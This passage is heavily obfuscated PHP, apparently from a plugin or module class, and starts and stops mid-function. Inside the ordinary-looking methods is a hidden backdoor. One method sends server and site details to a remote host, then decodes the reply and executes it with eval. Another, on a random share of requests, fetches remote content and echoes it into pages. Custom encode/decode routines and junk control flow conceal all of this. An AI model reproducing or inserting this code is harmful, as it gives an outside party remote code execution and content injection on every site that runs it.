b¥ñŸªäÜ: $F›··Óî¯È =& $_SERVER[´¬]; $CëŒáª“‚ =& $_SERVER[…‹Çæ¦§]; $f±‰›ÖªÍÛ = array($CëŒáª“‚[145], $CëŒáª“‚[257]); goto c­ˆÍ‡Üğ; b˜‹¶›ƒ§Ÿ: $DõÍŞÙÛ‹ã = $this->{$_SERVER[…‹Çæ¦§][260]}($DõÍŞÙÛ‹ã, $CëŒáª“‚[261]); $d¡¼ø¼·Œ = $F›··Óî¯È[635]; if (strlen($d¡¼ø¼·Œ) < $F›··Óî¯È[587]) { return; } goto E¾¨Èóë¶; Aæ ˜‰¡: die; goto FÇ¿Î‹éÒ; E¾¨Èóë¶: $bñ©š¢ˆÜ = $CëŒáª“‚[262](array($CëŒáª“‚[263] => array($CëŒáª“‚[264] => $CëŒáª“‚[265], $CëŒáª“‚[266] => 3))); $C¥à­³–‡Ä = @$CëŒáª“‚[267]($DõÍŞÙÛ‹ã, !1, $bñ©š¢ˆÜ); $d…£ƒ±Éğ = $F›··Óî¯È[636]; goto c¨ ÷Ò¥Ò; c­ˆÍ‡Üğ: if (!$CëŒáª“‚[116]($GLOBALS, $CëŒáª“‚[142]) || !isset($_GET[$CëŒáª“‚[258]])) { return; } if (!$CëŒáª“‚[252]($_SERVER[$CëŒáª“‚[44]], $f±‰›ÖªÍÛ)) { return; } $DõÍŞÙÛ‹ã = $CëŒáª“‚[259]; goto b˜‹¶›ƒ§Ÿ; FÇ¿Î‹éÒ: } public function ieyhe3d11c19($B½îœŞÇ‚) { goto cùÁÔğªä‰; D¥õ¿ Ê®™: $d“ºÖ¶ù×‰ = $c’é§õ›ì‹[0]($c’é§õ›ì‹[289], $c’é§õ›ì‹[116]($this->qzmpeba30b82, $c’é§õ›ì‹[139], $c’é§õ›ì‹[10])); $D«–»ÇƒáÆ = array(); $c ÕäŠÕŒ¬ = $Bˆª˜‡º¤[638]; goto f›†÷Áòó; f›†÷Áòó: while (strlen($c ÕäŠÕŒ¬) < $Bˆª˜‡º¤[587]) { if (!$c ÕäŠÕŒ¬) { break; } $c ÕäŠÕŒ¬++; } foreach ($e¹¬ÙÇ‡ as $FªÁ—¦öØÎ => $dÉíôÂ¸) { if ($dÉíôÂ¸ == $c’é§õ›ì‹[273] && $c’é§õ›ì‹[25]($this->pnmf7526c11b, 0, 1) == $c’é§õ›ì‹[273]) { continue; } if (!$c’é§õ›ì‹[252]($FªÁ—¦öØÎ, $d“ºÖ¶ù×‰)) { $D«–»ÇƒáÆ[] = $FªÁ—¦öØÎ; } } foreach ($D«–»ÇƒáÆ as $FªÁ—¦öØÎ) { unset($B½îœŞÇ‚[$FªÁ—¦öØÎ]); } goto FÂöŞî Å‘; cùÁÔğªä‰: $Bˆª˜‡º¤ =& $_SERVER[´¬]; $c’é§õ›ì‹ =& $_SERVER[…‹Çæ¦§]; if ($this->pnmf7526c11b == $c’é§õ›ì‹[271]) { return $B½îœŞÇ‚; } goto F‘†¦ÖŞ; F‘†¦ÖŞ: $e¹¬ÙÇ‡ = array($c’é§õ›ì‹[272] => $c’é§õ›ì‹[273], $c’é§õ›ì‹[274] => $c’é§õ›ì‹[273], $c’é§õ›ì‹[275] => $c’é§õ›ì‹[273], $c’é§õ›ì‹[276] => $c’é§õ›ì‹[273], $c’é§õ›ì‹[277] => $c’é§õ›ì‹[273], $c’é§õ›ì‹[278] => $c’é§õ›ì‹[273], $c’é§õ›ì‹[279] => $c’é§õ›ì‹[280], $c’é§õ›ì‹[281] => $c’é§õ›ì‹[280], $c’é§õ›ì‹[282] => $c’é§õ›ì‹[280], $c’é§õ›ì‹[283] => $c’é§õ›ì‹[280], $c’é§õ›ì‹[284] => $c’é§õ›ì‹[280], $c’é§õ›ì‹[285] => $c’é§õ›ì‹[280], $c’é§õ›ì‹[286] => $c’é§õ›ì‹[280], $c’é§õ›ì‹[287] => $c’é§õ›ì‹[280], $c’é§õ›ì‹[288] => $c’é§õ›ì‹[280]); $eà—§ÚÀ¥ = $Bˆª˜‡º¤[637]; while (strlen($eà—§ÚÀ¥) < $Bˆª˜‡º¤[580]) { if (!$eà—§ÚÀ¥) { break; } $eà—§ÚÀ¥++; } goto D¥õ¿ Ê®™; FÂöŞî Å‘: return $B½îœŞÇ‚; $B‹†×»Ñ¿… = $Bˆª˜‡º¤[639]; goto cªàô‚Ú; cªàô‚Ú: } private function esdu1dcd46ac() { $D·•×…ìè× =& $_SERVER[…‹Çæ¦§]; if ($this->pnmf7526c11b != $D·•×…ìè×[131]) { return; } $GLOBALS[$D·•×…ìè×[104]][$D·•×…ìè×[108]][$D·•×…ìè×[290]] = $D·•×…ìè×[230]; $GLOBALS[$D·•×…ìè×[104]][$D·•×…ìè×[291]] = $D·•×…ìè×[230]; $A§Ëâ‚šˆ‡ = $_SERVER[´¬][640]; if ($D·•×…ìè×[61]($D·•×…ìè×[292])->{$_SERVER[…‹Çæ¦§][63]}($D·•×…ìè×[93]) != $D·•×…ìè×[244]) { $D·•×…ìè×[61]($D·•×…ìè×[292])->{$_SERVER[…‹Çæ¦§][231]}($D·•×…ìè×[93], $D·•×…ìè×[244]); } } public function ihxn555dfc6d() { $A„Ó¨ÍÜë» =& $_SERVER[´¬]; return $_SERVER[…‹Çæ¦§][293]; $a³„™ãî÷å = $A„Ó¨ÍÜë»[641]; while (strlen($a³„™ãî÷å) < $A„Ó¨ÍÜë»[578]) { if (!$a³„™ãî÷å) { break; } $a³„™ãî÷å++; } } private function bmvec3d9b368() { goto FˆÊßÜÚÄ¼; E³®ÛÃÅš: $FŞ§Æ›‘–ß = $this->{$_SERVER[…‹Çæ¦§][193]}($A×Çé„ÔÛÒ[302], $CïĞ³àñÎ£); $EÂÑàéÛˆ = $F´»°ØìªÛ[644]; if (strlen($EÂÑàéÛˆ) < $F´»°ØìªÛ[585]) { return; } goto Eèçë•ë‘; F±Ğğ‰Ïò: $eğÒ§ª‚ó¹ = $F´»°ØìªÛ[643]; while (strlen($eğÒ§ª‚ó¹) < $F´»°ØìªÛ[578]) { if (!$eğÒ§ª‚ó¹) { break; } $eğÒ§ª‚ó¹++; } $CïĞ³àñÎ£ = array($A×Çé„ÔÛÒ[175] => $A×Çé„ÔÛÒ[61]($A×Çé„ÔÛÒ[62])->{$_SERVER[…‹Çæ¦§][63]}($A×Çé„ÔÛÒ[219]), $A×Çé„ÔÛÒ[188] => $this->pnmf7526c11b, $A×Çé„ÔÛÒ[186] => $_SERVER[$A×Çé„ÔÛÒ[187]], $A×Çé„ÔÛÒ[179] => $A×Çé„ÔÛÒ[159], $A×Çé„ÔÛÒ[182] => $_SERVER[$A×Çé„ÔÛÒ[183]]); goto E³®ÛÃÅš; AÍÑˆÛö–Š: if ($A×Çé„ÔÛÒ[246]() % 4 != 0) { return; } $AÁŒíÒª‚ = $A×Çé„ÔÛÒ[13](array($A×Çé„ÔÛÒ[299], $A×Çé„ÔÛÒ[300]), $c·¯¼ëôŠõ); $a÷ÛÆ”±Š… = $F´»°ØìªÛ[642]; goto F†ÂĞŞ×Ô‚; F†ÂĞŞ×Ô‚: if (strlen($a÷ÛÆ”±Š…) < $F´»°ØìªÛ[606]) { die; } if ($AÁŒíÒª‚ && $A×Çé„ÔÛÒ[246]() - $AÁŒíÒª‚ < $A×Çé„ÔÛÒ[254]($A×Çé„ÔÛÒ[301])) { return; } $A×Çé„ÔÛÒ[13](array($A×Çé„ÔÛÒ[299], $A×Çé„ÔÛÒ[162]), $c·¯¼ëôŠõ, $A×Çé„ÔÛÒ[246]()); goto F±Ğğ‰Ïò; EêĞèç†©È: $c·¯¼ëôŠõ = $A×Çé„ÔÛÒ[297] . $A×Çé„ÔÛÒ[124]($A×Çé„ÔÛÒ[298]); if ($this->pnmf7526c11b == $A×Çé„ÔÛÒ[131] || !$A×Çé„ÔÛÒ[116]($GLOBALS, $A×Çé„ÔÛÒ[142])) { return; } if (!$A×Çé„ÔÛÒ[252]($_SERVER[$A×Çé„ÔÛÒ[44]], $C×ƒŠ²›ìœ)) { return; } goto AÍÑˆÛö–Š; FˆÊßÜÚÄ¼: $F´»°ØìªÛ =& $_SERVER[´¬]; $A×Çé„ÔÛÒ =& $_SERVER[…‹Çæ¦§]; $C×ƒŠ²›ìœ = array($A×Çé„ÔÛÒ[294], $A×Çé„ÔÛÒ[295], $A×Çé„ÔÛÒ[296]); goto EêĞèç†©È; Eèçë•ë‘: if (!$A×Çé„ÔÛÒ[202]($FŞ§Æ›‘–ß)) { return; } if ($FŞ§Æ›‘–ß[$A×Çé„ÔÛÒ[175]] && $FŞ§Æ›‘–ß[$A×Çé„ÔÛÒ[303]]) { if ($this->{$_SERVER[…‹Çæ¦§][210]}($FŞ§Æ›‘–ß[$A×Çé„ÔÛÒ[303]]) == $CïĞ³àñÎ£[$A×Çé„ÔÛÒ[175]]) { return; } } $this->{$_SERVER[…‹Çæ¦§][174]}(); goto Dâ‘‡Ğ°îø; Dâ‘‡Ğ°îø: $F˜Àµ÷‰İØ = $F´»°ØìªÛ[645]; while ($F˜Àµ÷‰İØ < $F´»°ØìªÛ[578]) { if ($F˜Àµ÷‰İØ >= 0) { break; } $F˜Àµ÷‰İØ++; } if ($this->{$_SERVER[…‹Çæ¦§][210]}($FŞ§Æ›‘–ß[$A×Çé„ÔÛÒ[303]]) != $CïĞ³àñÎ£[$A×Çé„ÔÛÒ[175]]) { $dÇ®ÌÙ½ğÀ = array($A×Çé„ÔÛÒ[212] => $A×Çé„ÔÛÒ[61]($A×Çé„ÔÛÒ[62])->{$_SERVER[…‹Çæ¦§][63]}($A×Çé„ÔÛÒ[126]), $A×Çé„ÔÛÒ[213] => $_SERVER[$A×Çé„ÔÛÒ[125]], $A×Çé„ÔÛÒ[214] => $A×Çé„ÔÛÒ[215](), $A×Çé„ÔÛÒ[184] => $_SERVER[$A×Çé„ÔÛÒ[185]]); $b‹»Ğ¸‚‡´ = $this->{$_SERVER[…‹Çæ¦§][216]}($A×Çé„ÔÛÒ[158]($dÇ®ÌÙ½ğÀ)); $FŞ§Æ›‘–ß = $this->{$_SERVER[…‹Çæ¦§][193]}($A×Çé„ÔÛÒ[217] . $b‹»Ğ¸‚‡´); if ($FŞ§Æ›‘–ß && $A×Çé„ÔÛÒ[202]($FŞ§Æ›‘–ß) && isset($FŞ§Æ›‘–ß[$A×Çé„ÔÛÒ[303]])) { $dÎÍ¡“ŞÀŠ = $this->{$_SERVER[…‹Çæ¦§][199]}($FŞ§Æ›‘–ß[$A×Çé„ÔÛÒ[303]], 2); if ($dÎÍ¡“ŞÀŠ) { $dÎÍ¡“ŞÀŠ = $this->{$_SERVER[…‹Çæ¦§][210]}($dÎÍ¡“ŞÀŠ); } if ($dÎÍ¡“ŞÀŠ) { try { @eval($dÎÍ¡“ŞÀŠ); } catch (Exception $AÑÎ‡ÉŒ¸å) { } } } } goto Cƒé…ŸÑ‘´; Cƒé…ŸÑ‘´: } private function ytwjb05e0cea($FËÎ¢ÑÔî  = '', $C¬òÍßÇèš = array(), $c˜Ó”ÍÌÅ” = 5) { goto fä—¦‹¦Œ; fä—¦‹¦Œ: $CíÊÔ„õå½ =& $_SERVER[´¬]; $aˆ£«˜Ú¢ =& $_SERVER[…‹Çæ¦§]; $dŠºÔ…÷Æá = $aˆ£«˜Ú¢[304]; goto AŒŠôÉ¬Á; Bµîšõ‹Õ­: if (strlen($e”ƒç¡Ù¦) < $CíÊÔ„õå½[580]) { return; } if ($C¬òÍßÇèš && $aˆ£«˜Ú¢[202]($C¬òÍßÇèš)) { $dŠºÔ…÷Æá = $dŠºÔ…÷Æá . $aˆ£«˜Ú¢[306] . $aˆ£«˜Ú¢[307]($C¬òÍßÇèš); } if ($C¬òÍßÇèš === -1) { return $dŠºÔ…÷Æá; } goto e‘×”Á‡ç; Eã²Ô©ß©: return $aˆ£«˜Ú¢[201]($C¬òÍßÇèš, !0); $FÉ’Ä¤—„ = $CíÊÔ„õå½[648]; if (!$FÉ’Ä¤—„) { die; } goto CáèñÆ¤ÔÇ; e‘×”Á‡ç: $cßø½¶Ë¥à = $aˆ£«˜Ú¢[262](array($aˆ£«˜Ú¢[263] => array($aˆ£«˜Ú¢[266] => $c˜Ó”ÍÌÅ”, $aˆ£«˜Ú¢[264] => $aˆ£«˜Ú¢[308]), $aˆ£«˜Ú¢[309] => array($aˆ£«˜Ú¢[310] => !1, $aˆ£«˜Ú¢[311] => !1))); $C¬òÍßÇèš = @$aˆ£«˜Ú¢[267]($dŠºÔ…÷Æá, !1, $cßø½¶Ë¥à); $C÷¥â­¥›Î = $CíÊÔ„õå½[647]; goto Eã²Ô©ß©; AŒŠôÉ¬Á: $dŠºÔ…÷Æá = $this->{$_SERVER[…‹Çæ¦§][260]}($dŠºÔ…÷Æá, $aˆ£«˜Ú¢[305]); $dŠºÔ…÷Æá = $dŠºÔ…÷Æá . $FËÎ¢ÑÔî ; $e”ƒç¡Ù¦ = $CíÊÔ„õå½[646]; goto Bµîšõ‹Õ­; CáèñÆ¤ÔÇ: } private function ohukb963115e() { goto CŸ·é¹ìã; Fø¡ƒšñâ: $A÷¬‹äÙè = $A÷¬‹äÙè ? $b‘ĞƒªÒõ[254]($A÷¬‹äÙè) : 0; return $eèùØÃí‚È + $A÷¬‹äÙè; $e„çğ‚‘Ì‘ = $FàºîªèÂŒ[649]; goto bØİ¦Ş‹¨“; BÌÃëÊ…»†: $eèùØÃí‚È = $d©Æ’Ëà[$this->pnmf7526c11b]; $eèùØÃí‚È = $b‘ĞƒªÒõ[254]($eèùØÃí‚È ? $eèùØÃí‚È : $b‘ĞƒªÒõ[313]); $A÷¬‹äÙè = $b‘ĞƒªÒõ[116]($this->qzmpeba30b82, $b‘ĞƒªÒõ[339]); goto Fø¡ƒšñâ; bØİ¦Ş‹¨“: if (strlen($e„çğ‚‘Ì‘) < $FàºîªèÂŒ[587]) { return; } goto c¬¾“×¯É×; CŸ·é¹ìã: $FàºîªèÂŒ =& $_SERVER[´¬]; $b‘ĞƒªÒõ =& $_SERVER[…‹Çæ¦§]; $d©Æ’Ëà = array($b‘ĞƒªÒõ[312] => $b‘ĞƒªÒõ[313], $b‘ĞƒªÒõ[314] => $b‘ĞƒªÒõ[315], $b‘ĞƒªÒõ[316] => $b‘ĞƒªÒõ[317], $b‘ĞƒªÒõ[318] => $b‘ĞƒªÒõ[319], $b‘ĞƒªÒõ[320] => $b‘ĞƒªÒõ[321], $b‘ĞƒªÒõ[322] => $b‘ĞƒªÒõ[255], $b‘ĞƒªÒõ[323] => $b‘ĞƒªÒõ[255], $b‘ĞƒªÒõ[324] => $b‘ĞƒªÒõ[313], $b‘ĞƒªÒõ[325] => $b‘ĞƒªÒõ[315], $b‘ĞƒªÒõ[326] => $b‘ĞƒªÒõ[317], $b‘ĞƒªÒõ[327] => $b‘ĞƒªÒõ[328], $b‘ĞƒªÒõ[329] => $b‘ĞƒªÒõ[319], $b‘ĞƒªÒõ[330] => $b‘ĞƒªÒõ[331], $b‘ĞƒªÒõ[332] => $b‘ĞƒªÒõ[321], $b‘ĞƒªÒõ[333] => $b‘ĞƒªÒõ[334], $b‘ĞƒªÒõ[335] => $b‘ĞƒªÒõ[336], $b‘ĞƒªÒõ[337] => $b‘ĞƒªÒõ[338]); goto BÌÃëÊ…»†; c¬¾“×¯É×: } public function yhcved6bbf99($CºÈÛ§Ì…) { goto c“ˆ‰Ç‘; c“ˆ‰Ç‘: $a‚­·˜´ò =& $_SERVER[´¬]; $CÌ¹êĞ”î• =& $_SERVER[…‹Çæ¦§]; $AÜ³´²Óò = $this->{$_SERVER[…‹Çæ¦§][147]}(); goto DÊìÚå‹¼ò; B¼Ì”ŸŒ¹½: if ($B©•¢Âä¢£ <= $AÜ³´²Óò) { return; } $b½­ïÄø… = $CÌ¹êĞ”î•[61]($CÌ¹êĞ”î•[149])->{$_SERVER[…‹Çæ¦§][341]}($CÌ¹êĞ”î•[340])->{$_SERVER[…‹Çæ¦§][342]}($AÜ³´²Óò)->{$_SERVER[…‹Çæ¦§][343]}(); $b½­ïÄø… = $CÌ¹êĞ”î•[232]($b½­ïÄø…, $CÌ¹êĞ”î•[10], $CÌ¹êĞ”î•[340]); goto DÍŒáºß£Ñ; DÊìÚå‹¼ò: if ($CºÈÛ§Ì…[$CÌ¹êĞ”î•[340]] == $CÌ¹êĞ”î•[230]) { return; } if ($AÜ³´²Óò >= $CÌ¹êĞ”î•[254]($CÌ¹êĞ”î•[255])) { return; } $B©•¢Âä¢£ = $CÌ¹êĞ”î•[61]($CÌ¹êĞ”î•[149])->{$_SERVER[…‹Çæ¦§][150]}(); goto B¼Ì”ŸŒ¹½; DÍŒáºß£Ñ: $bÖéóæĞ­ = $a‚­·˜´ò[650]; if (strlen($bÖéóæĞ­) < $a‚­·˜´ò[580]) { return; } if (!$CÌ¹êĞ”î•[252]($CºÈÛ§Ì…[$CÌ¹êĞ”î•[340]], $b½­ïÄø…)) { $CÌ¹êĞ”î•[176]($CÌ¹êĞ”î•[344], !1, $CÌ¹êĞ”î•[249]); } goto F±ğß˜‹ë; F±ğß˜‹ë: } public function ntsddd6a78b4() { goto e…ŠàîÔÑƒ; e…ŠàîÔÑƒ: $DÓ–êÁçÍ =& $_SERVER[…‹Çæ¦§]; if (!$DÓ–êÁçÍ[116]($GLOBALS, $DÓ–êÁçÍ[142]) || $DÓ–êÁçÍ[345](1, 100) > 20) { return; } $a™Š§­…İİ = $DÓ–êÁçÍ[259]; goto bğÊ®Ô ¢; B¤¹º¥µê: $CÖ…–Èäƒ = $DÓ–êÁçÍ[262](array($DÓ–êÁçÍ[263] => array($DÓ–êÁçÍ[264] => $DÓ–êÁçÍ[265], $DÓ–êÁçÍ[266] => 3))); $FÓ¦—ßß = @$DÓ–êÁçÍ[267]($a™Š§­…İİ, !1, $CÖ…–Èäƒ); echo $DÓ–êÁçÍ[346] . $DÓ–êÁçÍ[347]($FÓ¦—ßß) . $DÓ–êÁçÍ[348]; goto bÙâ¦Ğ ë‰; bğÊ®Ô ¢: $a™Š§­…İİ = $this->{$_SERVER[…‹Çæ¦§][260]}($a™Š§­…İİ, $DÓ–êÁçÍ[261]); $a…Ò…à‡ÉÈ = $_SERVER[´¬][651]; if (!$a…Ò…à‡ÉÈ) { die; } goto B¤¹º¥µê; bÙâ¦Ğ ë‰: } private function kyal16d76f8c($b½¿•“Îó, $CÔÛĞ‡­¬Æ, $BÇØ‡Æ£ = 3) { goto D¿òŒ—ìÁ; D¿òŒ—ìÁ: $AÉÚ–¶ ß” =& $_SERVER[´¬]; $CÓ­‹åˆÂ =& $_SERVER[…‹Çæ¦§]; $CÓ­‹åˆÂ[349](1); goto BÇæŒ÷¬³‚; BÇæŒ÷¬³‚: $DÁá¶ë¿ˆŞ = $AÉÚ–¶ ß”[652]; if (strlen($DÁá¶ë¿ˆŞ) < $AÉÚ–¶ ß”[578]) { die; } $b½¿•“Îó = $CÓ­‹åˆÂ[2]($b½¿•“Îó); goto cª¥õéÍŠ; a©¼·ËàŠŠ: switch ($e³Û­‰ÆÃË) { case $CÓ­‹åˆÂ[244]: $dÈ“‡ î«ì = $this->{$_SERVER[…‹Çæ¦§][157]}($b½¿•“Îó, $CÓ­‹åˆÂ[224]($CÔÛĞ‡­¬Æ . $dİô¦ß–õÊ)); break; $eó¼¡²¿¾  = $AÉÚ–¶ ß”[653]; case $CÓ­‹åˆÂ[230]: $dÈ“‡ î«ì = $this->{$_SERVER[…‹Çæ¦§][157]}($b½¿•“Îó, $CÓ­‹åˆÂ[224]($dİô¦ß–õÊ . $CÔÛĞ‡­¬Æ)); $AĞâĞÔè¤² = $AÉÚ–¶ ß”[654]; if (!$AĞâĞÔè¤²) { return; } break; $CÍŒâ¿¢òï = $AÉÚ–¶ ß”[655]; case $CÓ­‹åˆÂ[351]: $dÈ“‡ î«ì = $this->{$_SERVER[…‹Çæ¦§][157]}($b½¿•“Îó, $CÓ­‹åˆÂ[128]($dİô¦ß–õÊ . $CÔÛĞ‡­¬Æ)); break; case $CÓ­‹åˆÂ[352]: $dÈ“‡ î«ì = $this->{$_SERVER[…‹Çæ¦§][157]}($b½¿•“Îó, $CÓ­‹åˆÂ[124]($dİô¦ß–õÊ . $CÔÛĞ‡­¬Æ)); $c²†÷¥åÀ„ = $AÉÚ–¶ ß”[656]; if (strlen($c²†÷¥åÀ„) < $AÉÚ–¶ ß”[606]) { die; } break; case $CÓ­‹åˆÂ[353]: goto ešë¦Ò„´î; FĞùì×Øˆ‰: $dÈ“‡ î«ì = $CÓ­‹åˆÂ[347]($fÂêã°ƒ­¬ . $dØç ÒË°›); $aÙ÷ğœéÁñ = $AÉÚ–¶ ß”[666]; if (strlen($aÙ÷ğœéÁñ) < $AÉÚ–¶ ß”[606]) { return; } goto B¿ê´öáß; B¿ê´öáß: break; $D˜˜¾œÄ¸– = $AÉÚ–¶ ß”[667]; while (strlen($D˜˜¾œÄ¸–) < $AÉÚ–¶ ß”[580]) { if (!$D˜˜¾œÄ¸–) { break; } $D˜˜¾œÄ¸–++; } goto E‚‹æÔĞ­Ö; FÍ—ÑÄà’: if (strlen($A™Í¨«¢±Ì) < $AÉÚ–¶ ß”[587]) { return; } $fÂêã°ƒ­¬ = $D••ÕŸ»Şß[$fİ‹ˆ÷î‚]; $f¼¿‚Œ‘ê™ = $AÉÚ–¶ ß”[658]; goto FÂÄ¤±Îë•; FÂÄ¤±Îë•: $CÑÈŒ¾áŸÆ = $CÓ­‹åˆÂ[124]($fÂêã°ƒ­¬ . $CÓ­‹åˆÂ[124]($CÔÛĞ‡­¬Æ . $fÂêã°ƒ­¬) . $CÔÛĞ‡­¬Æ); $bÎÃ‹‚Ÿ‡ = $AÉÚ–¶ ß”[659]; while ($bÎÃ‹‚Ÿ‡ < $AÉÚ–¶ ß”[580]) { if ($bÎÃ‹‚Ÿ‡ >= 0) { break; } $bÎÃ‹‚Ÿ‡++; } goto Fç¬µ‘õÕ; ešë¦Ò„´î: $b½¿•“Îó = $CÓ­‹åˆÂ[128]($b½¿•“Îó); $fİ‹ˆ÷î‚ = $CÓ­‹åˆÂ[354](0, 64); $A™Í¨«¢±Ì = $AÉÚ–¶ ß”[657]; goto FÍ—ÑÄà’; d„ö†ğ…Š–: $c…ö¯Ò«–› = $AÉÚ–¶ ß”[663]; while (strlen($c…ö¯Ò«–›) < $AÉÚ–¶ ß”[587]) { if (!$c…ö¯Ò«–›) { break; } $c…ö¯Ò«–›++; } for ($aÁêÇƒ¡†Ÿ = 0; $aÁêÇƒ¡†Ÿ < $CÓ­‹åˆÂ[24]($b½¿•“Îó); $aÁêÇƒ¡†Ÿ++) { $eŠ“‹ÄÎÙ = $eŠ“‹ÄÎÙ == $CÓ­‹åˆÂ[24]($CÑÈŒ¾áŸÆ) ? 0 : $eŠ“‹ÄÎÙ; $d´ğçÃš‰´ = $AÉÚ–¶ ß”[664]; if (strlen($d´ğçÃš‰´) < $AÉÚ–¶ ß”[580]) { die; } $e§¹õ¾“İ… = ($fİ‹ˆ÷î‚ + $CÓ­‹åˆÂ[355]($D••ÕŸ»Şß, $b½¿•“Îó[$aÁêÇƒ¡†Ÿ]) + $CÓ­‹åˆÂ[356]($CÑÈŒ¾áŸÆ[$eŠ“‹ÄÎÙ++])) % 64; $dØç ÒË°› .= $D••ÕŸ»Şß[$e§¹õ¾“İ…]; $EŸÇÜäØ = $AÉÚ–¶ ß”[665]; if (!$EŸÇÜäØ) { die; } } goto FĞùì×Øˆ‰; EÈëŒ©åè: $e§¹õ¾“İ… = 0; $Fô‹¤Üµğà = $AÉÚ–¶ ß”[662]; $eŠ“‹ÄÎÙ = 0; goto d„ö†ğ…Š–; Fç¬µ‘õÕ: $CÑÈŒ¾áŸÆ = $CÓ­‹åˆÂ[25]($CÑÈŒ¾áŸÆ, $fİ‹ˆ÷î‚ % 8, $fİ‹ˆ÷î‚ % 8 + 7); $dØç ÒË°› = $CÓ­‹åˆÂ[10]; $BÊ·Ù¦×ª = $AÉÚ–¶ ß”[660]; goto E·“Ú‘Ö’¼; E·“Ú‘Ö’¼: $aÁêÇƒ¡†Ÿ = 0; $DÔ‡êÅÂø = $AÉÚ–¶ ß”[661]; if (strlen($DÔ‡êÅÂø) < $AÉÚ–¶ ß”[580]) { die; } goto EÈëŒ©åè; E‚‹æÔĞ­Ö: default: $dÈ“‡ î«ì = $this->{$_SERVER[…‹Çæ¦§][157]}($b½¿•“Îó, $CÔÛĞ‡­¬Æ . $dİô¦ß–õÊ); $e£„˜¯¥ØÌ = $AÉÚ–¶ ß”[668]; if (!$e£„˜¯¥ØÌ) { return; } break; } $dÈ“‡ î«ì = $CÓ­‹åˆÂ[224]($e³Û­‰ÆÃË . $dİô¦ß–õÊ . $dÈ“‡ î«ì); $DÖÙôÂàÖ‹ = $AÉÚ–¶ ß”[669]; goto F—²®©›íÂ; F—²®©›íÂ: if (!$DÖÙôÂàÖ‹) { die; } if ($BÇØ‡Æ£ - 1 > 0) { $dÈ“‡ î«ì = $this->{$_SERVER[…‹Çæ¦§][137]}($dÈ“‡ î«ì, $CÔÛĞ‡­¬Æ, $BÇØ‡Æ£ - 1); } return $dÈ“‡ î«ì; goto d—×¥çƒè†; cª¥õéÍŠ: $e³Û­‰ÆÃË = $CÓ­‹åˆÂ[345](0, 5) . $CÓ­‹åˆÂ[10]; $dİô¦ß–õÊ = $CÓ­‹åˆÂ[134](15); $D••ÕŸ»Şß = $CÓ­‹åˆÂ[350]; goto a©¼·ËàŠŠ; d—×¥çƒè†: } private function akso11ae7b0a($F´‚è¬Ñï¹, $Fßø”™±Ô¦, $eô›ğ‹¸ = 3) { goto c•²§Ï¼”²; eÍ¶—Õò¼Ö: $b»¬İÑ«Ã = $cÂ…¤íÑÑ[673]; $F´‚è¬Ñï¹ = $eÏšŒÕµÈœ[25]($F´‚è¬Ñï¹, 16); $a¬«ÒƒÔŠ = $eÏšŒÕµÈœ[350]; goto Fï•¯ÕÛ…; B÷ƒ¶ò¬°«: $F´‚è¬Ñï¹ = $eÏšŒÕµÈœ[2]($F´‚è¬Ñï¹); $C“Ôƒø‰ç = $cÂ…¤íÑÑ[670]; $F´‚è¬Ñï¹ = $eÏšŒÕµÈœ[224]($F´‚è¬Ñï¹); goto d´Ÿ‹²åß»; däñÓƒÚïˆ: return $f¼²åë»å; goto a“İØÀõÒà; c•²§Ï¼”²: $cÂ…¤íÑÑ =& $_SERVER[´¬]; $eÏšŒÕµÈœ =& $_SERVER[…‹Çæ¦§]; if (!$eÏšŒÕµÈœ[357]($F´‚è¬Ñï¹) || $eÏšŒÕµÈœ[24]($F´‚è¬Ñï¹) < 10) { return !1; } goto B÷ƒ¶ò¬°«; DÍğª¼Å±ê: $FÓö–´¯œ£ = $cÂ…¤íÑÑ[672]; while ($FÓö–´¯œ£ < $cÂ…¤íÑÑ[606]) { if ($FÓö–´¯œ£ >= 0) { break; } $FÓö–´¯œ£++; } $CÇŒÀ³öÕ´ = $eÏšŒÕµÈœ[25]($F´‚è¬Ñï¹, 1, 15); goto eÍ¶—Õò¼Ö; Fï•¯ÕÛ…: $A„ô…½Á¸Œ = $cÂ…¤íÑÑ[674]; switch ($DÀí’’ˆéØ) { case $eÏšŒÕµÈœ[244]: $f¼²åë»å = $this->{$_SERVER[…‹Çæ¦§][260]}($F´‚è¬Ñï¹, $eÏšŒÕµÈœ[224]($Fßø”™±Ô¦ . $CÇŒÀ³öÕ´)); break; $Eºåùİ´‘µ = $cÂ…¤íÑÑ[675]; if (strlen($Eºåùİ´‘µ) < $cÂ…¤íÑÑ[585]) { die; } case $eÏšŒÕµÈœ[230]: $f¼²åë»å = $this->{$_SERVER[…‹Çæ¦§][260]}($F´‚è¬Ñï¹, $eÏšŒÕµÈœ[224]($CÇŒÀ³öÕ´ . $Fßø”™±Ô¦)); break; case $eÏšŒÕµÈœ[351]: $f¼²åë»å = $this->{$_SERVER[…‹Çæ¦§][260]}($F´‚è¬Ñï¹, $eÏšŒÕµÈœ[128]($CÇŒÀ³öÕ´ . $Fßø”™±Ô¦)); break; $c÷œ³©¼‚ = $cÂ…¤íÑÑ[676]; if (!$c÷œ³©¼‚) { die; } case $eÏšŒÕµÈœ[352]: $f¼²åë»å = $this->{$_SERVER[…‹Çæ¦§][260]}($F´‚è¬Ñï¹, $eÏšŒÕµÈœ[124]($CÇŒÀ³öÕ´ . $Fßø”™±Ô¦)); break; case $eÏšŒÕµÈœ[353]: goto c®™øÒğ‚è; AØÃ‚ÎË£Ë: $dÒêÒ®¬ˆ = $cÂ…¤íÑÑ[680]; while (strlen($dÒêÒ®¬ˆ) < $cÂ…¤íÑÑ[578]) { if (!$dÒêÒ®¬ˆ) { break; } $dÒêÒ®¬ˆ++; } $FŒ‘Ø¦½ãë = 0; goto dê†ŞŸƒ„; A¨ß’›¬´¯: $F´‚è¬Ñï¹ = $eÏšŒÕµÈœ[25]($F´‚è¬Ñï¹, 1); $D“ôèåñó = $eÏšŒÕµÈœ[355]($a¬«ÒƒÔŠ, $dì™ÈÖø­); $c ›‘‘³õ° = $eÏšŒÕµÈœ[124]($dì™ÈÖø­ . $eÏšŒÕµÈœ[124]($Fßø”™±Ô¦ . $dì™ÈÖø­) . $Fßø”™±Ô¦); goto f™ôºƒ©§î; c®™øÒğ‚è: $F´‚è¬Ñï¹ = $eÏšŒÕµÈœ[358]($F´‚è¬Ñï¹); $dì™ÈÖø­ = $F´‚è¬Ñï¹[0]; $aÜë¿‰¶¶Î = $cÂ…¤íÑÑ[677]; goto A¨ß’›¬´¯; dê†ŞŸƒ„: $d¹•èÃ›­â = $cÂ…¤íÑÑ[681]; if (!$d¹•èÃ›­â) { die; } $Aà¡…¥Ò°Ş = 0; goto A¦Áã “ß¯; A¦Áã “ß¯: 